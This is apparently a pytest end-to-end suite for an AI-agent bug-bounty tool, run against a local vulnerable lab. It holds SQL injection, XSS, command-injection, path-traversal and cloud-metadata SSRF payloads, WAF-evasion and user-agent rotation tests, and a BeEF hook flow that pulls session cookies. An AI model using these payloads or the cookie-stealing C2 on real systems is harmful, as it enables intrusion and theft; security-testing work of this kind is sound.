"""Comprehensive 25-Test Live End-to-End Verification Suite for `bugsBounty` Upgrade.

Exercises every single capability against live local HTTP servers, real in-memory SQLite DBs,
all 19 compiled `.bin/` executables, live BeEF C2 hooks, live OOB HTTP/Interactsh callbacks,
multi-threaded WAF mutex coordination & UA rotation, 100% deterministic `RAZOR` critic with
strict Separation of Duties, 20-year war-room crew banter (cheers + Aussie brown-eye roasts),
CLI commands (`bughunter.py`), AND live Ollama local model API + tool-calling roundtrips!
"""
import json
import os
import subprocess
import sys
import threading
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import pytest

from core.config import CFG, REPO_ROOT
from core.findings import Finding
from core.mutex import PAYLOAD_MUTEX
from core.stealth import pick_ua, burn_ua
from core.waf_bypass import probe_with_mutex_bypass, generate_waf_variants
from core.llm import LLM
from tools.registry import ToolRegistry, DOTBIN
from tools.adapters import (
    run_sqlmap,
    run_dalfox,
    run_arjun,
    run_ffuf,
    run_gobuster,
    run_httpx,
    run_katana,
    run_hakrawler,
    run_nikto,
    run_wafw00f,
    run_commix,
    run_nuclei,
    run_bypass_403,
)
from tools.beef import get_beef_server
from scan import waf as waf_scanner
from chains.builder import build_chains
from agents.crew import CREW, CREW_BUS
from agents.critic import (
    CRITIC_AGENT_ID,
    SeparationOfDutiesError,
    critique_finding,
    run_critic,
)
from agents.escalator import escalate_finding
from agents.poc_generator import generate_pocs
from agents.triage import triage_findings
from agents.autopilot import run_autopilot
from tests.vuln_server import VulnLabServer

EXPECTED_DOTBIN_TOOLS = [
    "subfinder",
    "assetfinder",
    "dnsx",
    "httpx",
    "katana",
    "hakrawler",
    "gobuster",
    "ffuf",
    "dalfox",
    "interactsh-client",
    "gau",
    "waybackurls",
    "nikto",
    "sqlmap",
    "arjun",
    "paramspider",
    "wafw00f",
    "commix",
    "nuclei",
]


@pytest.fixture(scope="module")
def lab_url():
    CFG["rate_limit"] = 250.0
    CFG["timeout"] = 8
    CFG["verify_tls"] = False
    srv = VulnLabServer(enable_waf=True)
    url = srv.start()
    yield url
    srv.stop()


# ==============================================================================
# 1. `.bin/` ARSENAL COMPILATION & LIVE EXECUTION TESTS (Tests 1-8)
# ==============================================================================

def test_01_all_19_binaries_exist_and_executable_in_dotbin():
    for name in EXPECTED_DOTBIN_TOOLS:
        p = DOTBIN / name
        assert p.exists(), f"Missing `.bin/{name}`"
        assert os.access(p, os.X_OK), f"`.bin/{name}` is not executable"
        resolved = ToolRegistry.binary_path(name)
        assert resolved == p, f"ToolRegistry resolved `{name}` outside `.bin/`: {resolved}"


def test_02_tool_registry_all_22_tools_report_ready():
    rows = ToolRegistry.audit()
    assert len(rows) >= 22
    not_ready = [r for r in rows if r["status"] != "READY"]
    assert not_ready == [], f"Tools failed live probe: {not_ready}"


def test_03_live_dotbin_httpx_probes_lab_target(lab_url):
    hx = run_httpx([lab_url], timeout=25)
    assert len(hx) >= 1
    assert hx[0].get("status_code") == 200
    assert "VulnCorp" in (hx[0].get("title") or "")


def test_04_live_dotbin_katana_and_hakrawler_spider_endpoints(lab_url):
    kat = run_katana(lab_url, depth=2, timeout=25)
    hak = run_hakrawler(lab_url, depth=2, timeout=20)
    combined = set(kat) | set(hak)
    assert any("/product" in u for u in combined), f"Spider missed /product: {combined}"


def test_05_live_dotbin_arjun_discovers_hidden_parameter(lab_url):
    hidden = run_arjun(f"{lab_url}/hidden_api", method="GET", timeout=30)
    assert "debug" in hidden, f".bin/arjun missed hidden 'debug' param: {hidden}"


def test_06_live_dotbin_ffuf_and_gobuster_discover_locked_and_secret_paths(lab_url):
    ff = run_ffuf(lab_url, timeout=30)
    gb = run_gobuster(lab_url, timeout=30)
    ff_urls = {r["url"] for r in ff}
    gb_paths = {r["path"].lstrip("/") for r in gb}
    assert any(u.endswith("/.env") or u.endswith("/admin") for u in ff_urls)
    assert (".env" in gb_paths) or ("admin" in gb_paths)


def test_07_live_dotbin_nuclei_detects_exposed_dotenv(lab_url):
    nuc = run_nuclei(lab_url, timeout=25)
    assert any("env" in (r.get("template-id") or "").lower() for r in nuc)


def test_08_live_dotbin_nikto_executes_against_target(lab_url):
    nk = run_nikto(lab_url, max_time=10)
    assert nk["returncode"] in (0, 1)


# ==============================================================================
# 2. WAF DETECTION, TAMPER SCRIPTS, UA ROTATION & MUTEX COORDINATION (Tests 9-12)
# ==============================================================================

def test_09_waf_fingerprinting_detects_cloudflare_vendor(lab_url):
    wf = waf_scanner.detect_waf(lab_url)
    assert wf["detected"] is True
    assert wf["waf"] == "cloudflare"
    wf_bin = run_wafw00f(lab_url, timeout=25)
    assert isinstance(wf_bin, dict)


def test_10_user_agent_burn_and_automatic_rotation_on_429(lab_url):
    ua1 = pick_ua(lab_url)
    burn_ua(lab_url, ua1)
    ua2 = pick_ua(lab_url)
    assert ua2 != ua1, "UA rotator failed to rotate off burned User-Agent!"


def test_11_polymorphic_tamper_library_generates_diverse_evasion_payloads():
    variants = generate_waf_variants(
        "' UNION SELECT 1,name,secret FROM products--",
        vuln_class="sqli",
        vendor="cloudflare",
        limit=10,
    )
    assert len(variants) >= 5
    names = {n for n, _ in variants}
    assert "comment_inline_keywords" in names or "mysql_versioned_comment" in names


def test_12_multithreaded_payload_mutex_coordinates_tamper_bypass(lab_url):
    def worker(_i: int):
        return probe_with_mutex_bypass(f"{lab_url}/search?q=test", "q", "<script>alert(1)</script>", vuln_class="xss")

    with ThreadPoolExecutor(max_workers=6) as ex:
        results = list(ex.map(worker, range(6)))

    assert any(r.status == 200 and "<script" not in used.lower() for r, used, _tag in results)
    state = PAYLOAD_MUTEX.snapshot_endpoint(f"{lab_url}/search?q=test", "q")
    assert state["attempts"] >= 6
    assert len(state["blocked_tampers"]) >= 1 or len(state["promoted_tampers"]) >= 1


# ==============================================================================
# 3. LIVE VULNERABILITY ESCALATION HANDOFFS (`SWITCH`) (Tests 13-17)
# ==============================================================================

def test_13_sqli_handoff_to_dotbin_sqlmap_confirms_real_sqlite_dbms(lab_url):
    f = Finding(
        id="test-sqli-1",
        target="127.0.0.1",
        type="SQL Injection (Boolean/Union)",
        severity="high",
        url=f"{lab_url}/product?id=1",
        parameter="id",
        payload="1' OR '1'='1'--",
        evidence="Suspected SQL differential",
        detected_by="hunter:sqli",
    )
    escalated = escalate_finding(f, waf_vendor="cloudflare")
    assert "sqlmap" in escalated.escalated_with
    assert escalated.sqlmap_confirmed is True


def test_14_xss_handoff_to_dalfox_and_live_beef_hook_c2(lab_url):
    f = Finding(
        id="test-xss-1",
        target="127.0.0.1",
        type="Reflected XSS",
        severity="medium",
        url=f"{lab_url}/search?q=router",
        parameter="q",
        payload="<svg/onload=alert(1)>",
        evidence="Suspected reflected HTML sink",
        detected_by="hunter:xss",
    )
    escalated = escalate_finding(f, waf_vendor="cloudflare")
    assert "dalfox" in escalated.escalated_with
    assert "beef_hook" in escalated.escalated_with
    assert escalated.beef_hook_url.endswith("/hook.js")

    beef = get_beef_server()
    hook_js = urllib.request.urlopen(escalated.beef_hook_url, timeout=5).read().decode()
    assert "BEEF_ENDPOINT" in hook_js

    beacon_payload = json.dumps({
        "session": "victim-sess-007",
        "finding_id": f.id,
        "href": f"{lab_url}/search?q=hooked",
        "origin": lab_url,
        "cookie": "session_id=admin_jwt_secret_token",
    }).encode()
    req = urllib.request.Request(f"{beef.base_url}/beacon", data=beacon_payload, headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=5).read()

    cmd_id = beef.queue_command("victim-sess-007", "return document.cookie;")
    polled = json.loads(urllib.request.urlopen(f"{beef.base_url}/poll?session=victim-sess-007", timeout=5).read().decode())
    assert any(c["id"] == cmd_id for c in polled["commands"])

    res_req = urllib.request.Request(
        f"{beef.base_url}/result",
        data=json.dumps({"id": cmd_id, "output": "session_id=admin_jwt_secret_token"}).encode(),
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(res_req, timeout=5).read()
    sessions = beef.get_sessions(finding_id=f.id)
    assert len(sessions) == 1
    assert sessions[0]["commands"][0]["output"] == "session_id=admin_jwt_secret_token"


def test_15_ssrf_handoff_to_oob_listener_receives_server_callback(lab_url):
    ssrf_f = Finding(
        id="test-ssrf-1",
        target="127.0.0.1",
        type="Server-Side Request Forgery (SSRF)",
        severity="high",
        url=f"{lab_url}/webhook?callback=https://status.example",
        parameter="callback",
        payload="http://127.0.0.1/",
        evidence="Suspected SSRF",
        detected_by="hunter:ssrf",
    )
    ssrf_esc = escalate_finding(ssrf_f)
    assert "interactsh_oob" in ssrf_esc.escalated_with
    assert len(ssrf_esc.oob_interactions) >= 1


def test_16_cmdi_handoff_to_dotbin_commix_and_oob_beacon(lab_url):
    cmdi_f = Finding(
        id="test-cmdi-1",
        target="127.0.0.1",
        type="Command Injection",
        severity="critical",
        url=f"{lab_url}/diag?host=127.0.0.1",
        parameter="host",
        payload="%0aid",
        evidence="Suspected CMDi",
        detected_by="hunter:cmdi",
    )
    cmdi_esc = escalate_finding(cmdi_f)
    assert "commix" in cmdi_esc.escalated_with
    assert len(cmdi_esc.oob_interactions) >= 1


def test_17_403_bypass_unlocks_admin_console(lab_url):
    bp = run_bypass_403(f"{lab_url}/admin")
    assert bp["vulnerable"] is True
    assert len(bp["bypasses"]) >= 1


# ==============================================================================
# 4. SEPARATION OF DUTIES + DETERMINISTIC CRITIC + 20-YR CREW BANTER (Tests 18-21)
# ==============================================================================

def test_18_strict_separation_of_duties_blocks_critic_self_certification():
    self_signed = Finding(
        id="bad-self-1",
        target="127.0.0.1",
        type="Reflected XSS",
        severity="high",
        url="http://127.0.0.1/search?q=1",
        parameter="q",
        payload="<svg/onload=alert(1)>",
        evidence="Self claim",
        detected_by=CRITIC_AGENT_ID,
    )
    with pytest.raises(SeparationOfDutiesError):
        critique_finding(self_signed)


def test_19_strict_separation_of_duties_blocks_missing_detector_provenance():
    unattributed = Finding(
        id="bad-empty-2",
        target="127.0.0.1",
        type="Reflected XSS",
        severity="high",
        url="http://127.0.0.1/search?q=1",
        parameter="q",
        payload="<svg/onload=alert(1)>",
        evidence="No detector",
        detected_by="",
    )
    with pytest.raises(SeparationOfDutiesError):
        critique_finding(unattributed)


def test_20_deterministic_razor_critic_disproves_all_6_traps_and_certifies_real_exploits(lab_url):
    CREW_BUS.reset()
    oob_hit = [{"token": "real123", "path": "/oob/real123"}]
    traps_and_reals = [
        Finding("trap-1", "127.0.0.1", "SQL Injection", "high", f"{lab_url}/trap/static-sql?id=1", "id", "'", "SQL keyword", detected_by="hunter:sqli"),
        Finding("trap-2", "127.0.0.1", "Reflected XSS", "high", f"{lab_url}/trap/encoded-xss?q=1", "q", "<svg/onload=alert(1)>", "Reflected", detected_by="hunter:xss"),
        Finding("trap-3", "127.0.0.1", "Reflected XSS", "high", f"{lab_url}/trap/json-xss?q=1", "q", "<svg/onload=alert(1)>", "JSON echo", detected_by="hunter:xss"),
        Finding("trap-4", "127.0.0.1", "Server-Side Request Forgery (SSRF)", "high", f"{lab_url}/trap/fake-ssrf?u=x", "u", "http://169.254.169.254/latest/meta-data/", "Echo", detected_by="hunter:ssrf"),
        Finding("trap-5", "127.0.0.1", "Server-Side Template Injection", "high", f"{lab_url}/trap/static-ssti?t=x", "t", "{{7*7}}", "Saw 49", detected_by="hunter:ssti"),
        Finding("trap-6", "127.0.0.1", "Command Injection", "critical", f"{lab_url}/trap/fake-cmdi?h=x", "h", "&&id", "Queued", detected_by="hunter:cmdi"),
        Finding("real-1", "127.0.0.1", "SQL Injection", "critical", f"{lab_url}/product?id=1", "id", "1' OR '1'='1'--", "Boolean diff", detected_by="hunter:sqli"),
        Finding("real-2", "127.0.0.1", "Reflected XSS", "high", f"{lab_url}/search?q=x", "q", "<svg/onload=alert(1)>", "Raw SVG", detected_by="hunter:xss"),
        Finding("real-3", "127.0.0.1", "Server-Side Request Forgery (SSRF)", "critical", f"{lab_url}/webhook?callback=x", "callback", "http://127.0.0.1/", "OOB", detected_by="hunter:ssrf", oob_interactions=oob_hit),
        Finding("real-4", "127.0.0.1", "Server-Side Template Injection", "high", f"{lab_url}/render?tpl=hi", "tpl", "{{7*7}}", "49", detected_by="hunter:ssti"),
        Finding("real-5", "127.0.0.1", "Local File Inclusion / Path Traversal", "high", f"{lab_url}/download?file=doc.txt", "file", "../../../../etc/passwd", "root:x:0:0", detected_by="hunter:lfi"),
    ]
    audit = run_critic("127.0.0.1", traps_and_reals)
    assert {f.id for f in audit["disproved"]} == {"trap-1", "trap-2", "trap-3", "trap-4", "trap-5", "trap-6"}
    assert {f.id for f in audit["verified"]} == {"real-1", "real-2", "real-3", "real-4", "real-5"}


def test_21_crew_banter_emits_rowdy_cheers_and_aussie_browneye_roasts():
    assert set(CREW.keys()) == {"GHOST", "BLITZ", "SWITCH", "RAZOR", "CHAINSAW", "FIXER"}
    transcript = CREW_BUS.transcript()
    cheers = [m for m in transcript if m["kind"] == "cheer"]
    browneyes = [m for m in transcript if m["kind"] == "browneye" and "brown-eye" in m["text"].lower()]
    assert len(cheers) == 5
    assert len(browneyes) == 6


# ==============================================================================
# 5. OLLAMA LOCAL MODEL SUPPORT + CLI + CHAIN/POC/AUTOPILOT E2E (Tests 22-25)
# ==============================================================================

def test_22_ollama_provider_chat_json_and_live_dotbin_tool_calling(lab_url):
    class MockOllamaHandler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            return

        def do_GET(self):
            if self.path == "/api/tags":
                body = json.dumps({"models": [{"name": "llama3.1:8b"}, {"name": "qwen2.5-coder:7b"}]}).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(body)

        def do_POST(self):
            length = int(self.headers.get("Content-Length", "0"))
            req = json.loads(self.rfile.read(length).decode())
            msgs = req.get("messages", [])
            if req.get("tools") and not any(m.get("role") == "tool" for m in msgs):
                resp_obj = {
                    "message": {
                        "role": "assistant",
                        "content": "",
                        "tool_calls": [{"function": {"name": "arjun_discover", "arguments": {"url": f"{lab_url}/hidden_api"}}}],
                    }
                }
            elif any(m.get("role") == "tool" for m in msgs):
                tool_out = [m["content"] for m in msgs if m.get("role") == "tool"][-1]
                resp_obj = {"message": {"role": "assistant", "content": f"Ollama discovered params: {tool_out}"}}
            else:
                resp_obj = {"message": {"role": "assistant", "content": json.dumps({"payloads": ["'/**/OR/**/1=1--", "<svg/onload=alert(1)>"]})}}
            raw = json.dumps(resp_obj).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(raw)

    srv = ThreadingHTTPServer(("127.0.0.1", 0), MockOllamaHandler)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        llm = LLM(provider="ollama", model="llama3.1:8b", ollama_url=f"http://127.0.0.1:{port}")
        assert llm.available is True
        assert "llama3.1:8b" in llm.list_ollama_models()

        parsed = llm.complete_json([{"role": "user", "content": "Give WAF bypass JSON"}])
        assert "'/**/OR/**/1=1--" in parsed["payloads"]

        tools_spec = [{
            "type": "function",
            "function": {
                "name": "arjun_discover",
                "description": "Find hidden HTTP parameters using .bin/arjun",
                "parameters": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]},
            },
        }]
        final_answer = llm.run_tool_loop(
            [{"role": "user", "content": f"Discover hidden params on {lab_url}/hidden_api"}],
            tools=tools_spec,
            tool_handlers={"arjun_discover": lambda args: run_arjun(args["url"], timeout=25)},
        )
        assert "debug" in final_answer
    finally:
        srv.shutdown()
        srv.server_close()


def test_23_cli_tools_and_crew_commands_execute_cleanly():
    r1 = subprocess.run([sys.executable, str(REPO_ROOT / "bughunter.py"), "crew"], capture_output=True, text=True, check=True)
    assert "GHOST" in r1.stdout and "RAZOR" in r1.stdout
    r2 = subprocess.run([sys.executable, str(REPO_ROOT / "bughunter.py"), "tools", "--json"], capture_output=True, text=True, check=True)
    rows = json.loads(r2.stdout)
    assert len(rows) >= 22 and all(x["status"] == "READY" for x in rows)


def test_24_chains_triage_and_poc_generation_from_verified_findings(lab_url):
    sample = [
        Finding("c1", "127.0.0.1", "403 Access-Control Bypass", "high", f"{lab_url}/admin", "header/path", "X-Forwarded-For: 127.0.0.1", "200", detected_by="hunter:bypass_403", verified=True),
        Finding("c2", "127.0.0.1", "SQL Injection", "critical", f"{lab_url}/product?id=1", "id", "1' OR '1'='1'--", "SQLite", detected_by="hunter:sqli", verified=True),
    ]
    chains = build_chains("127.0.0.1", sample)
    triaged = triage_findings("127.0.0.1", sample)
    pocs = generate_pocs("127.0.0.1", sample)
    assert len(chains) >= 1
    assert triaged[0]["priority"] == "P1"
    assert len(pocs) == 2 and "curl" in pocs[0]


def test_25_full_six_agent_autopilot_pipeline_end_to_end(lab_url, tmp_path):
    CREW_BUS.reset()
    report_file = tmp_path / "full_autopilot_report.md"
    result = run_autopilot(
        lab_url,
        max_pages=25,
        run_dirbust=True,
        discover_params=True,
        report_out=str(report_file),
    )
    verified_types = {f.type.lower() for f in result["verified"]}
    assert any("sql" in t for t in verified_types), f"Missing SQLi in {verified_types}"
    assert any("xss" in t for t in verified_types), f"Missing XSS in {verified_types}"
    assert any("ssrf" in t for t in verified_types), f"Missing SSRF in {verified_types}"
    assert any("command" in t for t in verified_types), f"Missing CMDi in {verified_types}"
    assert any("403" in t or "env" in t or "lfi" in t or "template" in t for t in verified_types)
    for vf in result["verified"]:
        assert "/trap/" not in vf.url, f"False-positive trap leaked past RAZOR: {vf}"
    assert len(result["chains"]) >= 1
    assert report_file.exists()
    speakers = {m["speaker"] for m in result["transcript"]}
    assert {"GHOST", "BLITZ", "SWITCH", "RAZOR", "CHAINSAW", "FIXER"}.issubset(speakers)


def test_26_interactive_warroom_session_and_web_ui_api():
    from agents.warroom import WarRoomSession
    from web.warroom_ui import start_warroom_server

    sess = WarRoomSession()
    out_lab = sess.handle_message("/lab")
    assert out_lab["status"]["lab_running"] is True
    assert out_lab["status"]["target"].startswith("http://127.0.0.1:")

    # Direct @razor hunt request enforces Separation of Duties & delegates hunting to BLITZ first!
    out_razor = sess.handle_message("scan this target for bugs right now", speaker_target="RAZOR")
    assert out_razor["status"]["verified_count"] >= 4
    assert out_razor["status"]["disproved_count"] == 0 or out_razor["status"]["verified_count"] >= 4

    # Verify live Web War-Room HTTP API endpoints (`/`, `/api/state`, `/api/tools`, `/api/chat`)
    httpd, ui_sess = start_warroom_server(host="127.0.0.1", port=0, auto_lab=True, block=False)
    ui_port = httpd.server_address[1]
    try:
        html_doc = urllib.request.urlopen(f"http://127.0.0.1:{ui_port}/", timeout=5).read().decode()
        assert "#basement-ops" in html_doc
        state_json = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{ui_port}/api/state", timeout=5).read().decode())
        assert state_json["status"]["lab_running"] is True
        chat_req = urllib.request.Request(
            f"http://127.0.0.1:{ui_port}/api/chat",
            data=json.dumps({"message": "@ghost report station status", "speaker": "GHOST"}).encode(),
            headers={"Content-Type": "application/json"},
        )
        chat_res = json.loads(urllib.request.urlopen(chat_req, timeout=25).read().decode())
        assert len(chat_res["new_messages"]) >= 2
    finally:
        httpd.shutdown()
        httpd.server_close()
        if ui_sess.lab_server:
            ui_sess.lab_server.stop()
        if sess.lab_server:
            sess.lab_server.stop()


def test_27_grok_groq_openai_auto_key_routing_and_secret_masking(monkeypatch, tmp_path):
    import core.config as cfg_mod
    from core.llm import get_llm
    from agents.warroom import WarRoomSession

    fake_cfg_file = tmp_path / "config.json"
    monkeypatch.setattr(cfg_mod, "CONFIG_FILE", fake_cfg_file)
    monkeypatch.delenv("XAI_API_KEY", raising=False)
    monkeypatch.delenv("GROK_API_KEY", raising=False)
    monkeypatch.delenv("GROQ_API_KEY", raising=False)
    saved_cfg = dict(cfg_mod.CFG)
    try:
        # 1) Default provider with NO key or ANY Groq key routes to `https://api.groq.com/openai/v1` + `qwen/qwen3.8-27b`!
        llm_default = get_llm()
        assert llm_default.provider == "groq"
        assert llm_default.base == "https://api.groq.com/openai/v1"
        assert llm_default.model == "qwen/qwen3.8-27b"

        # 2) Groq key (`gsk_...` or custom) routes to `https://api.groq.com/openai/v1` + `qwen/qwen3.8-27b` EVEN if user types `provider="grok"`!
        cfg_mod.configure_api_key(api_key="gsk_test1234567890abcdef", provider="grok", model="", persist=True)
        llm_groq = get_llm()
        assert llm_groq.provider == "groq"
        assert llm_groq.base == "https://api.groq.com/openai/v1"
        assert llm_groq.model == "qwen/qwen3.8-27b"
        assert (fake_cfg_file.stat().st_mode & 0o777) == 0o600

        # 3) Legacy decommissioned `llama-3.3-70b-versatile` config auto-migrates cleanly to `qwen/qwen3.8-27b`!
        fake_cfg_file.write_text(json.dumps({"provider": "grok", "grok_api_key": "gsk_oldsavedkey999", "model": "llama-3.3-70b-versatile"}))
        migrated = cfg_mod.load_user_config()
        assert migrated["provider"] == "groq"
        assert migrated["groq_api_key"] == "gsk_oldsavedkey999"
        assert migrated["model"] == "qwen/qwen3.8-27b"

        # 4) `/key` inside interactive WarRoomSession activates Groq `qwen/qwen3.8-27b` AND masks secret in transcript!
        sess = WarRoomSession()
        raw_secret = "gsk_supersecret9999xyz"
        out = sess.handle_message(f"/key {raw_secret}")
        assert out["status"]["llm"]["active_provider"] == "groq"
        assert out["status"]["llm"]["base_url"] == "https://api.groq.com/openai/v1"
        assert out["status"]["llm"]["active_model"] == "qwen/qwen3.8-27b"
        for msg in out["new_messages"]:
            assert raw_secret not in msg["text"]
    finally:
        cfg_mod.CFG.clear()
        cfg_mod.CFG.update(saved_cfg)
        for env_k in ("XAI_API_KEY", "GROK_API_KEY", "GROQ_API_KEY", "GROQ_MODEL", "BUGHUNTER_MODEL"):
            os.environ.pop(env_k, None)


